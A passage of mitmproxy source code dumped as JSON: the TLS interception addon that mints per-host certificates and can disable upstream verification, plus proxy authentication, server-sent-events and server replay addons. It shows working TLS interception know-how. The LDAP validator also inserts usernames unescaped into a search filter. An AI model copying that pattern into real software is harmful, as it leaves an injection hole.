\"DHE-RSA-AES128-GCM-SHA256\",\n    \"DHE-RSA-AES256-GCM-SHA384\",\n    \"DHE-RSA-CHACHA20-POLY1305\",\n    \"ECDHE-ECDSA-AES128-SHA256\",\n    \"ECDHE-RSA-AES128-SHA256\",\n    \"ECDHE-ECDSA-AES128-SHA\",\n    \"ECDHE-RSA-AES128-SHA\",\n    \"ECDHE-ECDSA-AES256-SHA384\",\n    \"ECDHE-RSA-AES256-SHA384\",\n    \"ECDHE-ECDSA-AES256-SHA\",\n    \"ECDHE-RSA-AES256-SHA\",\n    \"DHE-RSA-AES128-SHA256\",\n    \"DHE-RSA-AES256-SHA256\",\n    \"AES128-GCM-SHA256\",\n    \"AES256-GCM-SHA384\",\n    \"AES128-SHA256\",\n    \"AES256-SHA256\",\n    \"AES128-SHA\",\n    \"AES256-SHA\",\n    \"DES-CBC3-SHA\",\n)\n\n# 2022/05: X509_CHECK_FLAG_NEVER_CHECK_SUBJECT is not available in LibreSSL, ignore gracefully as it's not critical.\nDEFAULT_HOSTFLAGS = (\n    SSL._lib.X509_CHECK_FLAG_NO_PARTIAL_WILDCARDS  # type: ignore\n    | getattr(SSL._lib, \"X509_CHECK_FLAG_NEVER_CHECK_SUBJECT\", 0)  # type: ignore\n)\n\n\nclass AppData(TypedDict):\n    client_alpn: bytes | None\n    server_alpn: bytes | None\n    http2: bool\n\n\ndef alpn_select_callback(conn: SSL.Connection, options: list[bytes]) -> Any:\n    app_data: AppData = conn.get_app_data()\n    client_alpn = app_data[\"client_alpn\"]\n    server_alpn = app_data[\"server_alpn\"]\n    http2 = app_data[\"http2\"]\n    if client_alpn is not None:\n        if client_alpn in options:\n            return client_alpn\n        else:\n            return SSL.NO_OVERLAPPING_PROTOCOLS\n    if server_alpn and server_alpn in options:\n        return server_alpn\n    if server_alpn == b\"\":\n        # We do have a server connection, but the remote server refused to negotiate a protocol:\n        # We need to mirror this on the client connection.\n        return SSL.NO_OVERLAPPING_PROTOCOLS\n    http_alpns = proxy_tls.HTTP_ALPNS if http2 else proxy_tls.HTTP1_ALPNS\n    # client sends in order of preference, so we are nice and respect that.\n    for alpn in options:\n        if alpn in http_alpns:\n            return alpn\n    else:\n        return SSL.NO_OVERLAPPING_PROTOCOLS\n\n\nclass TlsConfig:\n    \"\"\"\n    This addon supplies the proxy core with the desired OpenSSL connection objects to negotiate TLS.\n    \"\"\"\n\n    certstore: certs.CertStore = None  # type: ignore\n\n    # TODO: We should support configuring TLS 1.3 cipher suites (https://github.com/mitmproxy/mitmproxy/issues/4260)\n    # TODO: We should re-use SSL.Context options here, if only for TLS session resumption.\n    #       This may require patches to pyOpenSSL, as some functionality is only exposed on contexts.\n    # TODO: This addon should manage the following options itself, which are current defined in mitmproxy/options.py:\n    #  - upstream_cert\n    #  - add_upstream_certs_to_client_chain\n    #  - ciphers_client\n    #  - ciphers_server\n    #  - key_size\n    #  - certs\n    #  - cert_passphrase\n    #  - ssl_verify_upstream_trusted_ca\n    #  - ssl_verify_upstream_trusted_confdir\n\n    def load(self, loader):\n        loader.add_option(\n            name=\"tls_version_client_min\",\n            typespec=str,\n            default=net_tls.DEFAULT_MIN_VERSION.name,\n            choices=[x.name for x in net_tls.Version],\n            help=f\"Set the minimum TLS version for client connections.\",\n        )\n        loader.add_option(\n            name=\"tls_version_client_max\",\n            typespec=str,\n            default=net_tls.DEFAULT_MAX_VERSION.name,\n            choices=[x.name for x in net_tls.Version],\n            help=f\"Set the maximum TLS version for client connections.\",\n        )\n        loader.add_option(\n            name=\"tls_version_server_min\",\n            typespec=str,\n            default=net_tls.DEFAULT_MIN_VERSION.name,\n            choices=[x.name for x in net_tls.Version],\n            help=f\"Set the minimum TLS version for server connections.\",\n        )\n        loader.add_option(\n            name=\"tls_version_server_max\",\n            typespec=str,\n            default=net_tls.DEFAULT_MAX_VERSION.name,\n            choices=[x.name for x in net_tls.Version],\n            help=f\"Set the maximum TLS version for server connections.\",\n        )\n        loader.add_option(\n            name=\"tls_ecdh_curve_client\",\n            typespec=str | None,\n            default=None,\n            help=\"Use a specific elliptic curve for ECDHE key exchange on client connections. \"\n            'OpenSSL syntax, for example \"prime256v1\" (see `openssl ecparam -list_curves`).',\n        )\n        loader.add_option(\n            name=\"tls_ecdh_curve_server\",\n            typespec=str | None,\n            default=None,\n            help=\"Use a specific elliptic curve for ECDHE key exchange on server connections. \"\n            'OpenSSL syntax, for example \"prime256v1\" (see `openssl ecparam -list_curves`).',\n        )\n\n    def tls_clienthello(self, tls_clienthello: tls.ClientHelloData):\n        conn_context = tls_clienthello.context\n        tls_clienthello.establish_server_tls_first = (\n            conn_context.server.tls and ctx.options.connection_strategy == \"eager\"\n        )\n\n    def tls_start_client(self, tls_start: tls.TlsData) -> None:\n        \"\"\"Establish TLS or DTLS between client and proxy.\"\"\"\n        if tls_start.ssl_conn is not None:\n            return  # a user addon has already provided the pyOpenSSL context.\n\n        assert isinstance(tls_start.conn, connection.Client)\n\n        client: connection.Client = tls_start.conn\n        server: connection.Server = tls_start.context.server\n\n        entry = self.get_cert(tls_start.context)\n\n        if not client.cipher_list and ctx.options.ciphers_client:\n            client.cipher_list = ctx.options.ciphers_client.split(\":\")\n        # don't assign to client.cipher_list, doesn't need to be stored.\n        cipher_list = client.cipher_list or DEFAULT_CIPHERS\n\n        if ctx.options.add_upstream_certs_to_client_chain:  # pragma: no cover\n            # exempted from coverage until https://bugs.python.org/issue18233 is fixed.\n            extra_chain_certs = server.certificate_list\n        else:\n            extra_chain_certs = []\n\n        ssl_ctx = net_tls.create_client_proxy_context(\n            method=net_tls.Method.DTLS_SERVER_METHOD\n            if tls_start.is_dtls\n            else net_tls.Method.TLS_SERVER_METHOD,\n            min_version=net_tls.Version[ctx.options.tls_version_client_min],\n            max_version=net_tls.Version[ctx.options.tls_version_client_max],\n            cipher_list=tuple(cipher_list),\n            ecdh_curve=ctx.options.tls_ecdh_curve_client,\n            chain_file=entry.chain_file,\n            request_client_cert=False,\n            alpn_select_callback=alpn_select_callback,\n            extra_chain_certs=tuple(extra_chain_certs),\n            dhparams=self.certstore.dhparams,\n        )\n        tls_start.ssl_conn = SSL.Connection(ssl_ctx)\n\n        tls_start.ssl_conn.use_certificate(entry.cert.to_pyopenssl())\n        tls_start.ssl_conn.use_privatekey(\n            crypto.PKey.from_cryptography_key(entry.privatekey)\n        )\n\n        # Force HTTP/1 for secure web proxies, we currently don't support CONNECT over HTTP/2.\n        # There is a proof-of-concept branch at https://github.com/mhils/mitmproxy/tree/http2-proxy,\n        # but the complexity outweighs the benefits for now.\n        if len(tls_start.context.layers) == 2 and isinstance(\n            tls_start.context.layers[0], modes.HttpProxy\n        ):\n            client_alpn: bytes | None = b\"http/1.1\"\n        else:\n            client_alpn = client.alpn\n\n        tls_start.ssl_conn.set_app_data(\n            AppData(\n                client_alpn=client_alpn,\n                server_alpn=server.alpn,\n                http2=ctx.options.http2,\n            )\n        )\n        tls_start.ssl_conn.set_accept_state()\n\n    def tls_start_server(self, tls_start: tls.TlsData) -> None:\n        \"\"\"Establish TLS or DTLS between proxy and server.\"\"\"\n        if tls_start.ssl_conn is not None:\n            return  # a user addon has already provided the pyOpenSSL context.\n\n        assert isinstance(tls_start.conn, connection.Server)\n\n        client: connection.Client = tls_start.context.client\n        # tls_start.conn may be different from tls_start.context.server, e.g. an upstream HTTPS proxy.\n        server: connection.Server = tls_start.conn\n        assert server.address\n\n        if ctx.options.ssl_insecure:\n            verify = net_tls.Verify.VERIFY_NONE\n        else:\n            verify = net_tls.Verify.VERIFY_PEER\n\n        if server.sni is None:\n            server.sni = client.sni or server.address[0]\n\n        if not server.alpn_offers:\n            if client.alpn_offers:\n                if ctx.options.http2:\n                    # We would perfectly support HTTP/1 -> HTTP/2, but we want to keep things on the same protocol\n                    # version. There are some edge cases where we want to mirror the regular server's behavior\n                    # accurately, for example header capitalization.\n                    server.alpn_offers = tuple(client.alpn_offers)\n                else:\n                    server.alpn_offers = tuple(\n                        x for x in client.alpn_offers if x != b\"h2\"\n                    )\n            else:\n                # We either have no client TLS or a client without ALPN.\n                # - If the client does use TLS but did not send an ALPN extension, we want to mirror that upstream.\n                # - If the client does not use TLS, there's no clear-cut answer. As a pragmatic approach, we also do\n                #   not send any ALPN extension in this case, which defaults to whatever protocol we are speaking\n                #   or falls back to HTTP.\n                server.alpn_offers = []\n\n        if not server.cipher_list and ctx.options.ciphers_server:\n            server.cipher_list = ctx.options.ciphers_server.split(\":\")\n        # don't assign to client.cipher_list, doesn't need to be stored.\n        cipher_list = server.cipher_list or DEFAULT_CIPHERS\n\n        client_cert: str | None = None\n        if ctx.options.client_certs:\n            client_certs = os.path.expanduser(ctx.options.client_certs)\n            if os.path.isfile(client_certs):\n                client_cert = client_certs\n            else:\n                server_name: str = server.sni or server.address[0]\n                p = os.path.join(client_certs, f\"{server_name}.pem\")\n                if os.path.isfile(p):\n                    client_cert = p\n\n        ssl_ctx = net_tls.create_proxy_server_context(\n            method=net_tls.Method.DTLS_CLIENT_METHOD\n            if tls_start.is_dtls\n            else net_tls.Method.TLS_CLIENT_METHOD,\n            min_version=net_tls.Version[ctx.options.tls_version_server_min],\n            max_version=net_tls.Version[ctx.options.tls_version_server_max],\n            cipher_list=tuple(cipher_list),\n            ecdh_curve=ctx.options.tls_ecdh_curve_server,\n            verify=verify,\n            ca_path=ctx.options.ssl_verify_upstream_trusted_confdir,\n            ca_pemfile=ctx.options.ssl_verify_upstream_trusted_ca,\n            client_cert=client_cert,\n            legacy_server_connect=ctx.options.ssl_insecure,\n        )\n\n        tls_start.ssl_conn = SSL.Connection(ssl_ctx)\n        if server.sni:\n            # We need to set SNI + enable hostname verification.\n            assert isinstance(server.sni, str)\n            # Manually enable hostname verification on the context object.\n            # https://wiki.openssl.org/index.php/Hostname_validation\n            param = SSL._lib.SSL_get0_param(tls_start.ssl_conn._ssl)  # type: ignore\n            # Matching on the CN is disabled in both Chrome and Firefox, so we disable it, too.\n            # https://www.chromestatus.com/feature/4981025180483584\n\n            SSL._lib.X509_VERIFY_PARAM_set_hostflags(param, DEFAULT_HOSTFLAGS)  # type: ignore\n\n            try:\n                ip: bytes = ipaddress.ip_address(server.sni).packed\n            except ValueError:\n                host_name = server.sni.encode(\"idna\")\n                tls_start.ssl_conn.set_tlsext_host_name(host_name)\n                ok = SSL._lib.X509_VERIFY_PARAM_set1_host(  # type: ignore\n                    param, host_name, len(host_name)\n                )  # type: ignore\n                SSL._openssl_assert(ok == 1)  # type: ignore\n            else:\n                # RFC 6066: Literal IPv4 and IPv6 addresses are not permitted in \"HostName\",\n                # so we don't call set_tlsext_host_name.\n                ok = SSL._lib.X509_VERIFY_PARAM_set1_ip(param, ip, len(ip))  # type: ignore\n                SSL._openssl_assert(ok == 1)  # type: ignore\n        elif verify is not net_tls.Verify.VERIFY_NONE:\n            raise ValueError(\"Cannot validate certificate hostname without SNI\")\n\n        if server.alpn_offers:\n            tls_start.ssl_conn.set_alpn_protos(server.alpn_offers)\n\n        tls_start.ssl_conn.set_connect_state()\n\n    def quic_start_client(self, tls_start: quic.QuicTlsData) -> None:\n        \"\"\"Establish QUIC between client and proxy.\"\"\"\n        if tls_start.settings is not None:\n            return  # a user addon has already provided the settings.\n        tls_start.settings = quic.QuicTlsSettings()\n\n        # keep the following part in sync with `tls_start_client`\n        assert isinstance(tls_start.conn, connection.Client)\n\n        client: connection.Client = tls_start.conn\n        server: connection.Server = tls_start.context.server\n\n        entry = self.get_cert(tls_start.context)\n\n        if not client.cipher_list and ctx.options.ciphers_client:\n            client.cipher_list = ctx.options.ciphers_client.split(\":\")\n\n        if ctx.options.add_upstream_certs_to_client_chain:  # pragma: no cover\n            extra_chain_certs = server.certificate_list\n        else:\n            extra_chain_certs = []\n\n        # set context parameters\n        if client.cipher_list:\n            tls_start.settings.cipher_suites = [\n                CipherSuite[cipher] for cipher in client.cipher_list\n            ]\n        # if we don't have upstream ALPN, we allow all offered by the client\n        tls_start.settings.alpn_protocols = [\n            alpn.decode(\"ascii\")\n            for alpn in [alpn for alpn in (client.alpn, server.alpn) if alpn]\n            or client.alpn_offers\n        ]\n\n        # set the certificates\n        tls_start.settings.certificate = entry.cert._cert\n        tls_start.settings.certificate_private_key = entry.privatekey\n        tls_start.settings.certificate_chain = [\n            cert._cert for cert in (*entry.chain_certs, *extra_chain_certs)\n        ]\n\n    def quic_start_server(self, tls_start: quic.QuicTlsData) -> None:\n        \"\"\"Establish QUIC between proxy and server.\"\"\"\n        if tls_start.settings is not None:\n            return  # a user addon has already provided the settings.\n        tls_start.settings = quic.QuicTlsSettings()\n\n        # keep the following part in sync with `tls_start_server`\n        assert isinstance(tls_start.conn, connection.Server)\n\n        client: connection.Client = tls_start.context.client\n        server: connection.Server = tls_start.conn\n        assert server.address\n\n        if ctx.options.ssl_insecure:\n            tls_start.settings.verify_mode = ssl.CERT_NONE\n        else:\n            tls_start.settings.verify_mode = ssl.CERT_REQUIRED\n\n        if server.sni is None:\n            server.sni = client.sni or server.address[0]\n\n        if not server.alpn_offers:\n            if client.alpn_offers:\n                server.alpn_offers = tuple(client.alpn_offers)\n            else:\n                # aioquic fails if no ALPN is offered, so use H3\n                server.alpn_offers = tuple(alpn.encode(\"ascii\") for alpn in H3_ALPN)\n\n        if not server.cipher_list and ctx.options.ciphers_server:\n            server.cipher_list = ctx.options.ciphers_server.split(\":\")\n\n        # set context parameters\n        if server.cipher_list:\n            tls_start.settings.cipher_suites = [\n                CipherSuite[cipher] for cipher in server.cipher_list\n            ]\n        if server.alpn_offers:\n            tls_start.settings.alpn_protocols = [\n                alpn.decode(\"ascii\") for alpn in server.alpn_offers\n            ]\n\n        # set the certificates\n        # NOTE client certificates are not supported\n        tls_start.settings.ca_path = ctx.options.ssl_verify_upstream_trusted_confdir\n        tls_start.settings.ca_file = ctx.options.ssl_verify_upstream_trusted_ca\n\n    def running(self):\n        # FIXME: We have a weird bug where the contract for configure is not followed and it is never called with\n        # confdir or command_history as updated.\n        self.configure(\"confdir\")  # pragma: no cover\n\n    def configure(self, updated):\n        if (\n            \"certs\" in updated\n            or \"confdir\" in updated\n            or \"key_size\" in updated\n            or \"cert_passphrase\" in updated\n        ):\n            certstore_path = os.path.expanduser(ctx.options.confdir)\n            self.certstore = certs.CertStore.from_store(\n                path=certstore_path,\n                basename=CONF_BASENAME,\n                key_size=ctx.options.key_size,\n                passphrase=ctx.options.cert_passphrase.encode(\"utf8\")\n                if ctx.options.cert_passphrase\n                else None,\n            )\n            if self.certstore.default_ca.has_expired():\n                logging.warning(\n                    \"The mitmproxy certificate authority has expired!\\n\"\n                    \"Please delete all CA-related files in your ~/.mitmproxy folder.\\n\"\n                    \"The CA will be regenerated automatically after restarting mitmproxy.\\n\"\n                    \"See https://docs.mitmproxy.org/stable/concepts-certificates/ for additional help.\",\n                )\n\n            for certspec in ctx.options.certs:\n                parts = certspec.split(\"=\", 1)\n                if len(parts) == 1:\n                    parts = [\"*\", parts[0]]\n\n                cert = Path(parts[1]).expanduser()\n                if not cert.exists():\n                    raise exceptions.OptionsError(\n                        f\"Certificate file does not exist: {cert}\"\n                    )\n                try:\n                    self.certstore.add_cert_file(\n                        parts[0],\n                        cert,\n                        passphrase=ctx.options.cert_passphrase.encode(\"utf8\")\n                        if ctx.options.cert_passphrase\n                        else None,\n                    )\n                except ValueError as e:\n                    raise exceptions.OptionsError(\n                        f\"Invalid certificate format for {cert}: {e}\"\n                    ) from e\n\n        if \"tls_ecdh_curve_client\" in updated or \"tls_ecdh_curve_server\" in updated:\n            for ecdh_curve in [\n                ctx.options.tls_ecdh_curve_client,\n                ctx.options.tls_ecdh_curve_server,\n            ]:\n                if ecdh_curve is not None:\n                    try:\n                        crypto.get_elliptic_curve(ecdh_curve)\n                    except Exception as e:\n                        raise exceptions.OptionsError(\n                            f\"Invalid ECDH curve: {ecdh_curve!r}\"\n                        ) from e\n\n    def get_cert(self, conn_context: context.Context) -> certs.CertStoreEntry:\n        \"\"\"\n        This function determines the Common Name (CN), Subject Alternative Names (SANs) and Organization Name\n        our certificate should have and then fetches a matching cert from the certstore.\n        \"\"\"\n        altnames: list[x509.GeneralName] = []\n        organization: str | None = None\n\n        # Use upstream certificate if available.\n        if ctx.options.upstream_cert and conn_context.server.certificate_list:\n            upstream_cert = conn_context.server.certificate_list[0]\n            if upstream_cert.cn:\n                altnames.append(_ip_or_dns_name(upstream_cert.cn))\n            altnames.extend(upstream_cert.altnames)\n            if upstream_cert.organization:\n                organization = upstream_cert.organization\n\n        # Add SNI or our local IP address.\n        if conn_context.client.sni:\n            altnames.append(_ip_or_dns_name(conn_context.client.sni))\n        else:\n            altnames.append(_ip_or_dns_name(conn_context.client.sockname[0]))\n\n        # If we already know of a server address, include that in the SANs as well.\n        if conn_context.server.address:\n            altnames.append(_ip_or_dns_name(conn_context.server.address[0]))\n\n        # only keep first occurrence of each hostname\n        altnames = list(dict.fromkeys(altnames))\n\n        # RFC 2818: If a subjectAltName extension of type dNSName is present, that MUST be used as the identity.\n        # In other words, the Common Name is irrelevant then.\n        cn = next((str(x.value) for x in altnames), None)\n        return self.certstore.get_cert(cn, altnames, organization)\n\n\ndef _ip_or_dns_name(val: str) -> x509.GeneralName:\n    \"\"\"Convert a string into either an x509.IPAddress or x509.DNSName object.\"\"\"\n    try:\n        ip = ipaddress.ip_address(val)\n    except ValueError:\n        return x509.DNSName(val.encode(\"idna\").decode())\n    else:\n        return x509.IPAddress(ip)\n", "mitmproxy/addons/proxyauth.py": "from __future__ import annotations\n\nimport binascii\nimport weakref\nfrom abc import ABC\nfrom abc import abstractmethod\nfrom collections.abc import MutableMapping\nfrom typing import Optional\n\nimport ldap3\nimport passlib.apache\n\nfrom mitmproxy import connection\nfrom mitmproxy import ctx\nfrom mitmproxy import exceptions\nfrom mitmproxy import http\nfrom mitmproxy.net.http import status_codes\nfrom mitmproxy.proxy import mode_specs\nfrom mitmproxy.proxy.layers import modes\n\nREALM = \"mitmproxy\"\n\n\nclass ProxyAuth:\n    validator: Validator | None = None\n\n    def __init__(self) -> None:\n        self.authenticated: MutableMapping[connection.Client, tuple[str, str]] = (\n            weakref.WeakKeyDictionary()\n        )\n        \"\"\"Contains all connections that are permanently authenticated after an HTTP CONNECT\"\"\"\n\n    def load(self, loader):\n        loader.add_option(\n            \"proxyauth\",\n            Optional[str],\n            None,\n            \"\"\"\n            Require proxy authentication. Format:\n            \"username:pass\",\n            \"any\" to accept any user/pass combination,\n            \"@path\" to use an Apache htpasswd file,\n            or \"ldap[s]:url_server_ldap[:port]:dn_auth:password:dn_subtree[?search_filter_key=...]\" for LDAP authentication.\n            \"\"\",\n        )\n\n    def configure(self, updated):\n        if \"proxyauth\" in updated:\n            auth = ctx.options.proxyauth\n            if auth:\n                if auth == \"any\":\n                    self.validator = AcceptAll()\n                elif auth.startswith(\"@\"):\n                    self.validator = Htpasswd(auth)\n                elif ctx.options.proxyauth.startswith(\"ldap\"):\n                    self.validator = Ldap(auth)\n                elif \":\" in ctx.options.proxyauth:\n                    self.validator = SingleUser(auth)\n                else:\n                    raise exceptions.OptionsError(\"Invalid proxyauth specification.\")\n            else:\n                self.validator = None\n\n    def socks5_auth(self, data: modes.Socks5AuthData) -> None:\n        if self.validator and self.validator(data.username, data.password):\n            data.valid = True\n            self.authenticated[data.client_conn] = data.username, data.password\n\n    def http_connect(self, f: http.HTTPFlow) -> None:\n        if self.validator and self.authenticate_http(f):\n            # Make a note that all further requests over this connection are ok.\n            self.authenticated[f.client_conn] = f.metadata[\"proxyauth\"]\n\n    def requestheaders(self, f: http.HTTPFlow) -> None:\n        if self.validator:\n            # Is this connection authenticated by a previous HTTP CONNECT?\n            if f.client_conn in self.authenticated:\n                f.metadata[\"proxyauth\"] = self.authenticated[f.client_conn]\n            elif f.is_replay:\n                pass\n            else:\n                self.authenticate_http(f)\n\n    def authenticate_http(self, f: http.HTTPFlow) -> bool:\n        \"\"\"\n        Authenticate an HTTP request, returns if authentication was successful.\n\n        If valid credentials are found, the matching authentication header is removed.\n        In no or invalid credentials are found, flow.response is set to an error page.\n        \"\"\"\n        assert self.validator\n        username = None\n        password = None\n        is_valid = False\n\n        is_proxy = is_http_proxy(f)\n        auth_header = http_auth_header(is_proxy)\n        try:\n            auth_value = f.request.headers.get(auth_header, \"\")\n            scheme, username, password = parse_http_basic_auth(auth_value)\n            is_valid = self.validator(username, password)\n        except Exception:\n            pass\n\n        if is_valid:\n            f.metadata[\"proxyauth\"] = (username, password)\n            del f.request.headers[auth_header]\n            return True\n        else:\n            f.response = make_auth_required_response(is_proxy)\n            return False\n\n\ndef make_auth_required_response(is_proxy: bool) -> http.Response:\n    if is_proxy:\n        status_code = status_codes.PROXY_AUTH_REQUIRED\n        headers = {\"Proxy-Authenticate\": f'Basic realm=\"{REALM}\"'}\n    else:\n        status_code = status_codes.UNAUTHORIZED\n        headers = {\"WWW-Authenticate\": f'Basic realm=\"{REALM}\"'}\n\n    reason = http.status_codes.RESPONSES[status_code]\n    return http.Response.make(\n        status_code,\n        (\n            f\"<html>\"\n            f\"<head><title>{status_code} {reason}</title></head>\"\n            f\"<body><h1>{status_code} {reason}</h1></body>\"\n            f\"</html>\"\n        ),\n        headers,\n    )\n\n\ndef http_auth_header(is_proxy: bool) -> str:\n    if is_proxy:\n        return \"Proxy-Authorization\"\n    else:\n        return \"Authorization\"\n\n\ndef is_http_proxy(f: http.HTTPFlow) -> bool:\n    \"\"\"\n    Returns:\n        - True, if authentication is done as if mitmproxy is a proxy\n        - False, if authentication is done as if mitmproxy is an HTTP server\n    \"\"\"\n    return isinstance(\n        f.client_conn.proxy_mode, (mode_specs.RegularMode, mode_specs.UpstreamMode)\n    )\n\n\ndef mkauth(username: str, password: str, scheme: str = \"basic\") -> str:\n    \"\"\"\n    Craft a basic auth string\n    \"\"\"\n    v = binascii.b2a_base64((username + \":\" + password).encode(\"utf8\")).decode(\"ascii\")\n    return scheme + \" \" + v\n\n\ndef parse_http_basic_auth(s: str) -> tuple[str, str, str]:\n    \"\"\"\n    Parse a basic auth header.\n    Raises a ValueError if the input is invalid.\n    \"\"\"\n    scheme, authinfo = s.split()\n    if scheme.lower() != \"basic\":\n        raise ValueError(\"Unknown scheme\")\n    try:\n        user, password = (\n            binascii.a2b_base64(authinfo.encode()).decode(\"utf8\", \"replace\").split(\":\")\n        )\n    except binascii.Error as e:\n        raise ValueError(str(e))\n    return scheme, user, password\n\n\nclass Validator(ABC):\n    \"\"\"Base class for all username/password validators.\"\"\"\n\n    @abstractmethod\n    def __call__(self, username: str, password: str) -> bool:\n        raise NotImplementedError\n\n\nclass AcceptAll(Validator):\n    def __call__(self, username: str, password: str) -> bool:\n        return True\n\n\nclass SingleUser(Validator):\n    def __init__(self, proxyauth: str):\n        try:\n            self.username, self.password = proxyauth.split(\":\")\n        except ValueError:\n            raise exceptions.OptionsError(\"Invalid single-user auth specification.\")\n\n    def __call__(self, username: str, password: str) -> bool:\n        return self.username == username and self.password == password\n\n\nclass Htpasswd(Validator):\n    def __init__(self, proxyauth: str):\n        path = proxyauth[1:]\n        try:\n            self.htpasswd = passlib.apache.HtpasswdFile(path)\n        except (ValueError, OSError):\n            raise exceptions.OptionsError(f\"Could not open htpasswd file: {path}\")\n\n    def __call__(self, username: str, password: str) -> bool:\n        return self.htpasswd.check_password(username, password)\n\n\nclass Ldap(Validator):\n    conn: ldap3.Connection\n    server: ldap3.Server\n    dn_subtree: str\n    filter_key: str\n\n    def __init__(self, proxyauth: str):\n        (\n            use_ssl,\n            url,\n            port,\n            ldap_user,\n            ldap_pass,\n            self.dn_subtree,\n            self.filter_key,\n        ) = self.parse_spec(proxyauth)\n        server = ldap3.Server(url, port=port, use_ssl=use_ssl)\n        conn = ldap3.Connection(server, ldap_user, ldap_pass, auto_bind=True)\n        self.conn = conn\n        self.server = server\n\n    @staticmethod\n    def parse_spec(spec: str) -> tuple[bool, str, int | None, str, str, str, str]:\n        try:\n            if spec.count(\":\") > 4:\n                (\n                    security,\n                    url,\n                    port_str,\n                    ldap_user,\n                    ldap_pass,\n                    dn_subtree,\n                ) = spec.split(\":\")\n                port = int(port_str)\n            else:\n                security, url, ldap_user, ldap_pass, dn_subtree = spec.split(\":\")\n                port = None\n\n            if \"?\" in dn_subtree:\n                dn_subtree, search_str = dn_subtree.split(\"?\")\n                key, value = search_str.split(\"=\")\n                if key == \"search_filter_key\":\n                    search_filter_key = value\n                else:\n                    raise ValueError\n            else:\n                search_filter_key = \"cn\"\n\n            if security == \"ldaps\":\n                use_ssl = True\n            elif security == \"ldap\":\n                use_ssl = False\n            else:\n                raise ValueError\n\n            return (\n                use_ssl,\n                url,\n                port,\n                ldap_user,\n                ldap_pass,\n                dn_subtree,\n                search_filter_key,\n            )\n        except ValueError:\n            raise exceptions.OptionsError(f\"Invalid LDAP specification: {spec}\")\n\n    def __call__(self, username: str, password: str) -> bool:\n        if not username or not password:\n            return False\n        self.conn.search(self.dn_subtree, f\"({self.filter_key}={username})\")\n        if self.conn.response:\n            c = ldap3.Connection(\n                self.server, self.conn.response[0][\"dn\"], password, auto_bind=True\n            )\n            if c:\n                return True\n        return False\n", "mitmproxy/addons/server_side_events.py": "import logging\n\nfrom mitmproxy import http\n\n\nclass ServerSideEvents:\n    \"\"\"\n    Server-Side Events are currently swallowed if there's no streaming,\n    see https://github.com/mitmproxy/mitmproxy/issues/4469.\n\n    Until this bug is fixed, this addon warns the user about this.\n    \"\"\"\n\n    def response(self, flow: http.HTTPFlow):\n        assert flow.response\n        is_sse = flow.response.headers.get(\"content-type\", \"\").startswith(\n            \"text/event-stream\"\n        )\n        if is_sse and not flow.response.stream:\n            logging.warning(\n                \"mitmproxy currently does not support server side events. As a workaround, you can enable response \"\n                \"streaming for such flows: https://github.com/mitmproxy/mitmproxy/issues/4469\"\n            )\n", "mitmproxy/addons/serverplayback.py": "import hashlib\nimport logging\nimport urllib\nfrom collections.abc import Hashable\nfrom collections.abc import Sequence\nfrom typing import Any\n\nimport mitmproxy.types\nfrom mitmproxy import command\nfrom mitmproxy import ctx\nfrom mitmproxy import exceptions\nfrom mitmproxy import flow\nfrom mitmproxy import hooks\nfrom mitmproxy import http\nfrom mitmproxy import io\n\nlogger = logging.getLogger(__name__)\n\nHASH_OPTIONS = [\n    \"server_replay_ignore_content\",\n    \"server_replay_ignore_host\",\n    \"server_replay_ignore_params\",\n    \"server_replay_ignore_payload_params\",\n    \"server_replay_ignore_port\",\n    \"server_replay_use_headers\",\n]\n\n\nclass ServerPlayback:\n    flowmap: dict[Hashable, list[http.HTTPFlow]]\n    configured: bool\n\n    def __init__(self):\n        self.flowmap = {}\n        self.configured = False\n\n    def load(self, loader):\n        loader.add_option(\n            \"server_replay_kill_extra\",\n            bool,\n            False,\n            \"Kill extra requests during replay (for which no replayable response was found).\"\n            \"[Deprecated, prefer to use server_replay_extra='kill']\",\n        )\n        loader.add_option(\n            \"server_replay_extra\",\n            str,\n            \"forward\",\n            \"Behaviour for extra requests during replay for which no replayable response was found. \"\n            \"Setting a numeric string value will return an empty HTTP response with the respective status code.\",\n            choices=[\"forward\", \"kill\", \"204\", \"400\", \"404\", \"500\"],\n        )\n        loader.add_option(\n            \"server_replay_reuse\",\n            bool,\n            False,\n            \"\"\"\n            Don't remove flows from server replay state after use. This makes it\n            possible to replay same response multiple times.\n            \"\"\",\n        )\n        loader.add_option(\n            \"server_replay_nopop\",\n            bool,\n            False,\n            \"\"\"\n            Deprecated alias for `server_replay_reuse`.\n            \"\"\",\n        )\n        loader.add_option(\n            \"server_replay_refresh\",\n            bool,\n            True,\n            \"\"\"\n            Refresh server replay responses by adjusting date, expires and\n            last-modified headers, as well as adjusting cookie expiration.\n            \"\"\",\n        )\n        loader.add_option(\n            \"server_replay_use_headers\",\n            Sequence[str],\n            [],\n            \"\"\"\n            Request headers that need to match while searching for a saved flow\n            to replay.\n            \"\"\",\n        )\n        loader.add_option(\n            \"server_replay\",\n            Sequence[str],\n            [],\n            \"Replay server responses from a saved file.\",\n        )\n        loader.add_option(\n            \"server_replay_ignore_content\",\n            bool,\n            False,\n            \"Ignore request content while searching for a saved flow to replay.\",\n        )\n        loader.add_option(\n            \"server_replay_ignore_params\",\n            Sequence[str],\n            [],\n            \"\"\"\n            Request parameters to be ignored while searching for a saved flow\n            to replay.\n            \"\"\",\n        )\n        loader.add_option(\n            \"server_replay_ignore_payload_params\",\n            Sequence[str],\n            [],\n            \"\"\"\n            Request payload parameters (application/x-www-form-urlencoded or\n            multipart/form-data) to be ignored while searching for a saved flow\n            to replay.\n            \"\"\",\n        )\n        loader.add_option(\n            \"server_replay_ignore_host\",\n            bool,\n            False,\n            \"\"\"\n            Ignore request destination host while searching for a saved flow\n            to replay.\n            \"\"\",\n        )\n        loader.add_option(\n            \"server_replay_ignore_port\",\n            bool,\n            False,\n            \"\"\"\n            Ignore request destination port while searching for a saved flow\n            to replay.\n            \"\"\",\n        )\n\n    @command.command(\"replay.server\")\n    def load_flows(self, flows: Sequence[flow.Flow]) -> None:\n        \"\"\"\n        Replay server responses from flows.\n        \"\"\"\n        self.flowmap = {}\n        self.add_flows(flows)\n\n    @command.command(\"replay.server.add\")\n    def add_flows(self, flows: Sequence[flow.Flow]) -> None:\n        \"\"\"\n        Add responses from flows to server replay list.\n        \"\"\"\n        for f in flows:\n            if isinstance(f, http.HTTPFlow):\n                lst = self.flowmap.setdefault(self._hash(f), [])\n                lst.append(f)\n        ctx.master.addons.trigger(hooks.UpdateHook([]))\n\n    @command.command(\"replay.server.file\")\n    def load_file(self, path: mitmproxy.types.Path) -> None:\n        try:\n            flows = io.read_flows_from_paths([path])\n        except exceptions.FlowReadException as e:\n            raise 